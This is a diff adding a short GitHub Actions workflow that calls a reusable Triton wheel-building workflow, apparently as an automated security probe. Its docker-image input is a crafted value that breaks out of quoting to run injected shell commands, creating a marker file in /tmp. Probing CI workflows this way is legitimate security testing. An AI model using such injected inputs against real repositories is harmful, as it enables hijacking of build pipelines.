@@ -1,0 +1,10 @@
+name: argus-call-20
+on:
+  workflow_dispatch:
+jobs:
+  call:
+    uses: ./.github/workflows/prepare-triton-wheel.yaml
+    with:
+      docker-image: "x\"; touch /tmp/pwned_docker-image; ls; exit 1; #"
+      artifact-name: "x"
+      retention-days: "3"
